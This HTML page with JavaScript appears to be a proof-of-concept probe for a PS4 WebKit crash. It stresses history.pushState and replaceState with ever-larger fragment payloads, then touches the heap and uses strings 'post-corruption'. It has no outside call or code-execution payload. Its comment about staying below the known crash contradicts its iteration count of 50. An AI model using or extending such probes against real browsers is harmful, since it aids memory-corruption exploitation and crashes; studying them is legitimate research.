<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit – Reduced Pressure Crash Boundary</title>

</head>

<body>
<h2>PS4 WebKit – Reduced Pressure Boundary Test</h2>
<button onclick="run()">RUN TEST</button>
<div id="log"></div>

<script>
const logEl = document.getElementById("log");
function log(m){ logEl.textContent += m + "\n"; }

function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

async function run(){
    log("=== TEST START ===");

    const BASE = 977;
    const STEP = 14461;

    let size = BASE;
    const ITERATIONS = 50; // ↓ abaixo do crash conhecido (~44–46)

    try {
        // -------------------------
        // FASE 1 – POC ORIGINAL (REDUZIDA)
        // -------------------------
        log("[1] history.pushState / replaceState");
        for(let i=0;i<ITERATIONS;i++){
            const payload = "A".repeat(size);

            log(`[ITER ${i}] size=${size}`);
            history.pushState({}, "", "#"+payload);
            history.replaceState({}, "", "#"+payload.slice(0, payload.length >> 1));

            // apenas async back
            if(i % 6 === 0){
                setTimeout(()=>history.back(),0);
                log("  history.back (async)");
            }

            size += STEP;
            await sleep(5);
        }
        log("[1] Completed WITHOUT crash");

        // -------------------------
        // FASE 2 – Respiro controlado
        // -------------------------
        log("[2] Cooldown before heap interaction");
        await sleep(120);

        // -------------------------
        // FASE 3 – Heap touch leve
        // -------------------------
        log("[3] Light heap touch");
        let tmp = [];
        for(let i=0;i<40;i++){
            tmp.push("T"+i+"_"+"X".repeat(512));
        }
        log("[3] Heap touch done");

        await sleep(60);

        // -------------------------
        // FASE 4 – Uso pós-corrupção
        // -------------------------
        log("[4] Post-history usage (CRITICAL)");
        for(let i=0;i<tmp.length;i++){
            let s = tmp[i] + tmp[(i+1)%tmp.length];
            if(i % 5 === 0) log("[use] len="+s.length);
        }

        log("[4] Completed – NO CRASH");
        log("=== TEST FINISHED CLEAN ===");

    } catch(e){
        log("[!] JS Exception: " + e);
    }
}

log("Ready.");
</script>
</body>
</html>

